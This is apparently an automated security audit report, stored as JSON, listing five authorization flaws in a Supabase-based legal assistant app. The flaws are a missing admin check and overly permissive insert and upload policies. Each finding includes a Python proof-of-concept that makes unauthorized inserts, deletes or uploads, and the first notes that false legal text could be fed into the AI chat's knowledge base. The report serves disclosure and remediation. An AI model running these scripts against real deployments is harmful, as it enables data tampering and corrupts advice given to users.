@@ -1,0 +1,198 @@
+[
+  {
+    "id": "vuln-0001",
+    "title": "Missing Authorization in embed-document Edge Function",
+    "severity": "high",
+    "timestamp": "2026-07-12 09:57:49 UTC",
+    "description": "The embed-document Edge Function (`supabase/functions/embed-document/index.ts`) authenticates users via JWT but uses the service_role database client (which bypasses all Row-Level Security) for all database operations. The function never checks whether the authenticated user holds an admin or moderator role before performing create, update, or delete operations on the `legal_knowledge` table.\n\nThis means any authenticated user can add, modify, or delete knowledge base documents — including the legal reference data that powers the RAG-based legal chat.",
+    "impact": "Any authenticated user can arbitrarily modify the legal knowledge base that powers the AI legal chat system. An attacker could inject false legal information (leading to incorrect AI advice), delete legitimate legal references (causing gaps in AI responses), or manipulate the knowledge base for malicious purposes. Since the knowledge base is shared across all users, a single authenticated user can compromise the integrity of the entire application's legal advice system.",
+    "target": "https://github.com/zhengzhicong98-source/legal-assistant",
+    "technical_analysis": "In `supabase/functions/embed-document/index.ts`, the function:\n\n1. Authenticates the user via JWT (line 50-61): `await userClient.auth.getUser(token)` — only validates token, never checks role.\n\n2. Creates a service_role client for all DB operations (line 59): `const supabase = createClient(supabaseUrl, serviceKey)` — this bypasses all RLS policies.\n\n3. DELETE handler (line 91-102): Deletes from `legal_knowledge` using service_role client without admin check.\n\n4. PATCH handler (line 131-141): Updates `legal_knowledge.embedding` using service_role client without admin check.\n\n5. POST handler (line ~175+): Inserts new `legal_knowledge` entries using service_role client without admin check.\n\nThe `requireAdmin` function from `_shared/auth.ts` is available in the codebase but is never imported or used in embed-document. Additionally, the RLS policies in migration 00026 were tightened to require admin/moderator role for legal_knowledge mutations, but this Edge Function bypasses all RLS by using the service_role key.",
+    "poc_description": "1. Obtain any valid JWT token (e.g., by registering a user account)\n2. Send a POST request to the embed-document Edge Function with the JWT in the Authorization header\n3. Include a JSON body with `title`, `content`, and `source` fields\n4. The function will insert the document into `legal_knowledge` using the service_role key, bypassing RLS\n5. Similarly, send a DELETE request with an `id` field to delete any knowledge base entry",
+    "poc_script_code": "# This PoC demonstrates the vulnerability conceptually\n# The embed-document function accepts POST with JWT auth for any authenticated user\n# but uses service_role key for DB operations without checking admin/moderator role\n\nimport requests\n\nSUPABASE_URL = \"https://your-project.supabase.co\"\nANON_KEY = \"your-anon-key\"\n\n# Step 1: Get a valid session token (any authenticated user)\n# This simulates a normal user obtaining a token\nheaders = {\n    \"Authorization\": f\"Bearer {ANON_KEY}\",\n    \"Content-Type\": \"application/json\"\n}\n# In practice, use supabase.auth.signUp() or similar\n\n# Step 2: Call embed-document to create a knowledge base entry\n# Any authenticated user can do this, not just admins\npayload = {\n    \"title\": \"Attacker Controlled Legal Document\",\n    \"source\": \"Attacker Source\",\n    \"category\": \"恶意篡改\",\n    \"content\": \"This is false legal information injected by an attacker.\"\n}\n\nresponse = requests.post(\n    f\"{SUPABASE_URL}/functions/v1/embed-document\",\n    headers={\"Authorization\": f\"Bearer {VALID_USER_TOKEN}\", **headers},\n    json=payload\n)\nprint(f\"Create response: {response.status_code} - {response.text}\")\n\n# Step 3: Delete any knowledge base entry by ID\n# Also possible with an authenticated user (no admin check)\ndelete_payload = {\"id\": \"any-knowledge-base-id\"}\nresponse = requests.delete(\n    f\"{SUPABASE_URL}/functions/v1/embed-document\",\n    headers={\"Authorization\": f\"Bearer {VALID_USER_TOKEN}\", **headers},\n    json=delete_payload\n)\nprint(f\"Delete response: {response.status_code} - {response.text}\")",
+    "remediation_steps": "1. Import `requireAdmin` from `../_shared/auth.ts` in `supabase/functions/embed-document/index.ts`\n2. After JWT authentication in each mutation handler (DELETE, PATCH, POST), call `requireAdmin(user, req)` to verify the user has admin or moderator role\n3. If `requireAdmin` returns a non-null Response, return that Response immediately\n4. For the read-only GET handler, the existing JWT authentication is sufficient\n\nExample fix for the POST handler:\n```typescript\nconst authResult = await requireAuth(req)\nif (authResult instanceof Response) return authResult\nconst { user, supabaseAdmin } = authResult\n\n// Check admin/moderator role\nconst adminCheck = requireAdmin(user, req)\nif (adminCheck) return adminCheck\n```\n\nApply the same pattern to DELETE and PATCH handlers.",
+    "cvss": 7.6,
+    "cvss_breakdown": {
+      "attack_vector": "N",
+      "attack_complexity": "L",
+      "privileges_required": "L",
+      "user_interaction": "N",
+      "scope": "U",
+      "confidentiality": "L",
+      "integrity": "H",
+      "availability": "L"
+    },
+    "endpoint": "supabase/functions/embed-document/index.ts",
+    "method": "POST",
+    "cwe": "CWE-862",
+    "code_locations": [
+      {
+        "file": "supabase/functions/embed-document/index.ts",
+        "start_line": 50,
+        "end_line": 61,
+        "snippet": "    const authHeader = req.headers.get('Authorization')\n    if (!authHeader || !authHeader.startsWith('Bearer ')) {\n      return new Response(\n        JSON.stringify({ error: '请先登录', code: 'UNAUTHORIZED' }),\n        { status: 401, headers: { ...cors, 'Content-Type': 'application/json' } }\n      )\n    }\n    const token = authHeader.replace('Bearer ', '')\n    const supabaseUrl = Deno.env.get('SUPABASE_URL')!\n    const serviceKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!\n    const userClient = createClient(supabaseUrl, Deno.env.get('SUPABASE_ANON_KEY')!)\n    const { data: { user }, error: authError } = await userClient.auth.getUser(token)\n    if (authError || !user) {",
+        "label": "JWT auth without role check, then service_role client creation",
+        "fix_before": "    const authHeader = req.headers.get('Authorization')\n    if (!authHeader || !authHeader.startsWith('Bearer ')) {\n      return new Response(\n        JSON.stringify({ error: '请先登录', code: 'UNAUTHORIZED' }),\n        { status: 401, headers: { ...cors, 'Content-Type': 'application/json' } }\n      )\n    }\n    const token = authHeader.replace('Bearer ', '')\n    const supabaseUrl = Deno.env.get('SUPABASE_URL')!\n    const serviceKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!\n    const userClient = createClient(supabaseUrl, Deno.env.get('SUPABASE_ANON_KEY')!)\n    const { data: { user }, error: authError } = await userClient.auth.getUser(token)\n    if (authError || !user) {",
+        "fix_after": "    const authHeader = req.headers.get('Authorization')\n    if (!authHeader || !authHeader.startsWith('Bearer ')) {\n      return new Response(\n        JSON.stringify({ error: '请先登录', code: 'UNAUTHORIZED' }),\n        { status: 401, headers: { ...cors, 'Content-Type': 'application/json' } }\n      )\n    }\n    const token = authHeader.replace('Bearer ', '')\n    const supabaseUrl = Deno.env.get('SUPABASE_URL')!\n    const serviceKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!\n    const userClient = createClient(supabaseUrl, Deno.env.get('SUPABASE_ANON_KEY')!)\n    const { data: { user }, error: authError } = await userClient.auth.getUser(token)\n    if (authError || !user) {\n      return new Response(\n        JSON.stringify({ error: '认证失败，请重新登录', code: 'AUTH_FAILED' }),\n        { status: 401, headers: { ...cors, 'Content-Type': 'application/json' } }\n      )\n    }\n\n    // Check role: require admin/moderator\n    const { data: profile } = await userClient\n      .from('profiles')\n      .select('role')\n      .eq('id', user.id)\n      .single()\n\n    const userRole = profile?.role || 'user'\n    if (!['admin', 'moderator'].includes(userRole)) {\n      return new Response(\n        JSON.stringify({ error: '权限不足，需要管理员权限', code: 'FORBIDDEN' }),\n        { status: 403, headers: { ...cors, 'Content-Type': 'application/json' } }\n      )\n    }"
+      }
+    ],
+    "agent_id": "bdebbed5",
+    "agent_name": "strix"
+  },
+  {
+    "id": "vuln-0002",
+    "title": "Overly Permissive RLS Policy - quality_scores INSERT Allows Anonymous Writes",
+    "severity": "medium",
+    "timestamp": "2026-07-12 09:58:09 UTC",
+    "description": "The `quality_scores` table in migration 00028 has an INSERT RLS policy that allows any request (including unauthenticated/anonymous requests) to insert rows. The policy `\"insert scores\" ON quality_scores FOR INSERT WITH CHECK (true)` has no authentication or authorization requirements.",
+    "impact": "An unauthenticated attacker can arbitrarily insert fraudulent quality scoring data into the quality_scores table. This can pollute the quality statistics view (quality_stats) that powers the admin dashboard, causing incorrect AI evaluation metrics. In a production context, this could mask actual quality issues or generate false alerts.",
+    "target": "https://github.com/zhengzhicong98-source/legal-assistant",
+    "technical_analysis": "Migration `supabase/migrations/00028_add_quality_scores.sql` at line 34 creates an RLS policy:\n\n```sql\nCREATE POLICY \"insert scores\" ON quality_scores\n  FOR INSERT WITH CHECK (true);\n```\n\nThe `WITH CHECK (true)` clause means no authentication or authorization is required. Any HTTP request to the Supabase REST API (even without a JWT token) can insert data into this table. The table contains fields like `user_id`, `relevance`, `accuracy`, `overall`, and `raw_response`.",
+    "poc_description": "1. Send an INSERT request to the Supabase REST API for the `quality_scores` table without any Authorization header\n2. The request will succeed because the RLS policy has `WITH CHECK (true)` — no authentication required\n3. Verify the data was inserted by querying the table",
+    "poc_script_code": "# An unauthenticated POST to the Supabase REST API for quality_scores\n# succeeds because the RLS policy has WITH CHECK (true)\nimport requests\n\nSUPABASE_URL = \"https://your-project.supabase.co\"\nANON_KEY = \"your-anon-key\"\n\n# No JWT token needed - just anon key (which is public)\nresponse = requests.post(\n    f\"{SUPABASE_URL}/rest/v1/quality_scores\",\n    headers={\n        \"apikey\": ANON_KEY,\n        \"Content-Type\": \"application/json\"\n        # NO Authorization header - unauthenticated\n    },\n    json={\n        \"user_id\": \"00000000-0000-0000-0000-000000000000\",\n        \"relevance\": 0.1,\n        \"accuracy\": 0.1,\n        \"overall\": 0.1\n    }\n)\nprint(f\"Anonymous insert status: {response.status_code}\")\nprint(f\"Response: {response.text}\")",
+    "remediation_steps": "Replace the permissive policy in migration 00028 with one that requires authentication:\n\n```sql\nDROP POLICY IF EXISTS \"insert scores\" ON quality_scores;\nCREATE POLICY \"insert scores\" ON quality_scores\n  FOR INSERT WITH CHECK (auth.role() = 'authenticated');\n```\n\nAlternatively, if only admin users should be able to write scores:\n```sql\nDROP POLICY IF EXISTS \"insert scores\" ON quality_scores;\nCREATE POLICY \"insert scores\" ON quality_scores\n  FOR INSERT WITH CHECK (\n    EXISTS (SELECT 1 FROM profiles WHERE id = auth.uid() AND role = 'admin')\n  );\n```\n\nApply this change by creating a new migration file (e.g., 00029_fix_quality_scores_rls.sql).",
+    "cvss": 5.3,
+    "cvss_breakdown": {
+      "attack_vector": "N",
+      "attack_complexity": "L",
+      "privileges_required": "N",
+      "user_interaction": "N",
+      "scope": "U",
+      "confidentiality": "N",
+      "integrity": "L",
+      "availability": "N"
+    },
+    "endpoint": "supabase/migrations/00028_add_quality_scores.sql",
+    "cwe": "CWE-862",
+    "code_locations": [
+      {
+        "file": "supabase/migrations/00028_add_quality_scores.sql",
+        "start_line": 34,
+        "end_line": 35,
+        "snippet": "CREATE POLICY \"insert scores\" ON quality_scores\n  FOR INSERT WITH CHECK (true);",
+        "label": "Overly permissive INSERT policy",
+        "fix_before": "CREATE POLICY \"insert scores\" ON quality_scores\n  FOR INSERT WITH CHECK (true);",
+        "fix_after": "CREATE POLICY \"insert scores\" ON quality_scores\n  FOR INSERT WITH CHECK (auth.role() = 'authenticated');"
+      }
+    ],
+    "agent_id": "bdebbed5",
+    "agent_name": "strix"
+  },
+  {
+    "id": "vuln-0003",
+    "title": "Overly Permissive RLS Policy - trace_logs INSERT Allows Anonymous Writes",
+    "severity": "medium",
+    "timestamp": "2026-07-12 09:58:11 UTC",
+    "description": "The `trace_logs` table in migration 00021 has an INSERT RLS policy that allows any request (including unauthenticated) to insert rows. The policy `\"users can insert trace\" ON trace_logs FOR INSERT WITH CHECK (true)` requires no authentication or authorization.",
+    "impact": "An unauthenticated attacker can inject arbitrary trace log entries into the trace_logs table, potentially filling the database with spam data, polluting the trace monitoring view in the admin dashboard, or injecting malicious JSONB metadata payloads.",
+    "target": "https://github.com/zhengzhicong98-source/legal-assistant",
+    "technical_analysis": "Migration `supabase/migrations/00021_add_trace.sql` at line 20 creates:\n\n```sql\nCREATE POLICY \"users can insert trace\" ON trace_logs\n  FOR INSERT WITH CHECK (true);\n```\n\nThe `WITH CHECK (true)` clause means anyone can insert records. The `metadata` field is JSONB, which could allow various injection attempts.",
+    "poc_description": "1. Send an INSERT request to the Supabase REST API for the `trace_logs` table without any Authorization header\n2. The request will succeed because the RLS policy allows all inserts\n3. The attacker can inject arbitrary trace_id, span_name, and metadata values",
+    "poc_script_code": "# Anonymous insert into trace_logs succeeds because RLS policy is WITH CHECK (true)\nimport requests\n\nSUPABASE_URL = \"https://your-project.supabase.co\"\nANON_KEY = \"your-anon-key\"\n\nresponse = requests.post(\n    f\"{SUPABASE_URL}/rest/v1/trace_logs\",\n    headers={\n        \"apikey\": ANON_KEY,\n        \"Content-Type\": \"application/json\"\n        # No Authorization header\n    },\n    json={\n        \"trace_id\": \"attacker_trace_001\",\n        \"span_name\": \"spam\",\n        \"start_time\": \"2026-01-01T00:00:00Z\",\n        \"metadata\": {\"injected\": True}\n    }\n)\nprint(f\"Anonymous insert status: {response.status_code}\")",
+    "remediation_steps": "Replace the permissive policy in migration 00021:\n\n```sql\nDROP POLICY IF EXISTS \"users can insert trace\" ON trace_logs;\nCREATE POLICY \"users can insert trace\" ON trace_logs\n  FOR INSERT WITH CHECK (auth.role() = 'authenticated');\n```\n\nOptionally bind user_id to the authenticated user:\n```sql\nCREATE POLICY \"users can insert trace\" ON trace_logs\n  FOR INSERT WITH CHECK (\n    auth.role() = 'authenticated' AND\n    (user_id IS NULL OR user_id = auth.uid())\n  );\n```",
+    "cvss": 5.3,
+    "cvss_breakdown": {
+      "attack_vector": "N",
+      "attack_complexity": "L",
+      "privileges_required": "N",
+      "user_interaction": "N",
+      "scope": "U",
+      "confidentiality": "N",
+      "integrity": "L",
+      "availability": "N"
+    },
+    "endpoint": "supabase/migrations/00021_add_trace.sql",
+    "cwe": "CWE-862",
+    "code_locations": [
+      {
+        "file": "supabase/migrations/00021_add_trace.sql",
+        "start_line": 20,
+        "end_line": 21,
+        "snippet": "CREATE POLICY \"users can insert trace\" ON trace_logs\n  FOR INSERT WITH CHECK (true);",
+        "label": "Overly permissive INSERT policy",
+        "fix_before": "CREATE POLICY \"users can insert trace\" ON trace_logs\n  FOR INSERT WITH CHECK (true);",
+        "fix_after": "CREATE POLICY \"users can insert trace\" ON trace_logs\n  FOR INSERT WITH CHECK (auth.role() = 'authenticated');"
+      }
+    ],
+    "agent_id": "bdebbed5",
+    "agent_name": "strix"
+  },
+  {
+    "id": "vuln-0004",
+    "title": "Anonymous File Upload to contracts Storage Bucket",
+    "severity": "medium",
+    "timestamp": "2026-07-12 09:58:30 UTC",
+    "description": "The `contracts` storage bucket allows any request (including unauthenticated) to upload files. Migration 00014 originally restricted uploads to authenticated users but migration 00017 reverted this change, citing the need for anonymous upload in the contract review feature. However, this leaves the storage bucket open to anonymous abuse (storage costs, malware hosting, etc.).",
+    "impact": "An unauthenticated attacker can upload arbitrary files to the contracts storage bucket. While the file size and MIME type are validated by the bucket configuration (10MB max, image/* + application/pdf), the attacker can still fill the bucket with unwanted content, consume storage quotas, or use it for hosting malicious files accessed via the public read URL.",
+    "target": "https://github.com/zhengzhicong98-source/legal-assistant",
+    "technical_analysis": "Migration 00014 initially added `auth.role() = 'authenticated'` to the contracts bucket INSERT policy. However, migration 00017 reverted this change:\n\n```sql\nDROP POLICY IF EXISTS \"public_upload_contracts\" ON storage.objects;\nCREATE POLICY \"public_upload_contracts\" ON storage.objects\n  FOR INSERT WITH CHECK (bucket_id = 'contracts');\n```\n\nThe commit message states: \"原因：合同审查功能支持匿名上传（contract/index.tsx 未使用 useAuth）\". This means the codebase has a design tension between needing anonymous uploads and security.",
+    "poc_description": "Upload a file to the contracts storage bucket without any authentication token - the request will succeed because the INSERT policy has no auth check.",
+    "poc_script_code": "import requests\n\nSUPABASE_URL = \"https://your-project.supabase.co\"\nANON_KEY = \"your-anon-key\"\n\n# Anonymous file upload to contracts bucket\nresponse = requests.post(\n    f\"{SUPABASE_URL}/storage/v1/object/contracts/test.txt\",\n    headers={\n        \"apikey\": ANON_KEY,\n        \"Content-Type\": \"text/plain\"\n        # No JWT token\n    },\n    data=\"test content\"\n)\nprint(f\"Upload status: {response.status_code}\")",
+    "remediation_steps": "Restore the authenticated-only upload policy from migration 00014:\n\n```sql\nDROP POLICY IF EXISTS \"public_upload_contracts\" ON storage.objects;\nCREATE POLICY \"public_upload_contracts\" ON storage.objects\n  FOR INSERT WITH CHECK (bucket_id = 'contracts' AND auth.role() = 'authenticated');\n```\n\nIf anonymous upload is needed for the contract review flow, implement signed URL uploads or route uploads through the authenticated Edge Function instead.",
+    "cvss": 5.3,
+    "cvss_breakdown": {
+      "attack_vector": "N",
+      "attack_complexity": "L",
+      "privileges_required": "N",
+      "user_interaction": "N",
+      "scope": "U",
+      "confidentiality": "N",
+      "integrity": "L",
+      "availability": "N"
+    },
+    "endpoint": "supabase/migrations/00017_fix_contracts_bucket.sql",
+    "method": "POST",
+    "cwe": "CWE-862",
+    "code_locations": [
+      {
+        "file": "supabase/migrations/00017_fix_contracts_bucket.sql",
+        "start_line": 5,
+        "end_line": 7,
+        "label": "Anonymous file upload to contracts bucket",
+        "fix_before": "CREATE POLICY \"public_upload_contracts\" ON storage.objects\n  FOR INSERT WITH CHECK (bucket_id = 'contracts');",
+        "fix_after": "-- RLS enforced by Edge Function auth; anon key can initiate uploads via signed URL\nCREATE POLICY \"public_upload_contracts\" ON storage.objects\n  FOR INSERT WITH CHECK (bucket_id = 'contracts' AND auth.role() = 'authenticated');"
+      }
+    ],
+    "agent_id": "bdebbed5",
+    "agent_name": "strix"
+  },
+  {
+    "id": "vuln-0005",
+    "title": "Overly Permissive RLS Policy - ai_call_logs INSERT via NULL user_id",
+    "severity": "medium",
+    "timestamp": "2026-07-12 09:58:32 UTC",
+    "description": "The ai_call_logs table INSERT RLS policy allows inserts with `user_id IS NULL`, meaning an unauthenticated (or any authenticated) request can insert log records without linking them to a user. This allows anonymous injection of AI call log entries.",
+    "impact": "An attacker can inject fake AI call logs into the ai_call_logs table without authentication. These records would not be linked to any user, polluting observability data and potentially masking real issues.",
+    "target": "https://github.com/zhengzhicong98-source/legal-assistant",
+    "technical_analysis": "Migration `supabase/migrations/00006_add_observability.sql` at line 31:\n\n```sql\nCREATE POLICY \"users can insert own logs\" ON ai_call_logs\n  FOR INSERT WITH CHECK (auth.uid() = user_id OR user_id IS NULL);\n```\n\nThe `OR user_id IS NULL` clause allows anonymous/unauthenticated inserts into the ai_call_logs table.",
+    "poc_description": "Send an INSERT request to the Supabase REST API for ai_call_logs with user_id set to null. The INSERT will succeed because the policy allows user_id IS NULL.",
+    "poc_script_code": "import requests\n\nSUPABASE_URL = \"https://your-project.supabase.co\"\nANON_KEY = \"your-anon-key\"\n\n# Insert without user_id (IS NULL) succeeds\nresponse = requests.post(\n    f\"{SUPABASE_URL}/rest/v1/ai_call_logs\",\n    headers={\"apikey\": ANON_KEY, \"Content-Type\": \"application/json\"},\n    json={\n        \"function_name\": \"faked\",\n        \"model\": \"fake-model\",\n        \"success\": False\n    }\n)\nprint(f\"Status: {response.status_code}\")",
+    "remediation_steps": "Modify the INSERT policy in migration 00006 to require user_id matching the authenticated user:\n\n```sql\nDROP POLICY IF EXISTS \"users can insert own logs\" ON ai_call_logs;\nCREATE POLICY \"users can insert own logs\" ON ai_call_logs\n  FOR INSERT WITH CHECK (auth.uid() = user_id);\n```",
+    "cvss": 5.3,
+    "cvss_breakdown": {
+      "attack_vector": "N",
+      "attack_complexity": "L",
+      "privileges_required": "N",
+      "user_interaction": "N",
+      "scope": "U",
+      "confidentiality": "N",
+      "integrity": "L",
+      "availability": "N"
+    },
+    "endpoint": "supabase/migrations/00006_add_observability.sql",
+    "method": "POST",
+    "cwe": "CWE-862",
+    "code_locations": [
+      {
+        "file": "supabase/migrations/00006_add_observability.sql",
+        "start_line": 30,
+        "end_line": 32,
+        "label": "Overly permissive INSERT policy allows null user_id",
+        "fix_before": "CREATE POLICY \"users can insert own logs\" ON ai_call_logs\n  FOR INSERT WITH CHECK (auth.uid() = user_id OR user_id IS NULL);",
+        "fix_after": "CREATE POLICY \"users can insert own logs\" ON ai_call_logs\n  FOR INSERT WITH CHECK (auth.uid() = user_id);"
+      }
+    ],
+    "agent_id": "bdebbed5",
+    "agent_name": "strix"
+  }
+]
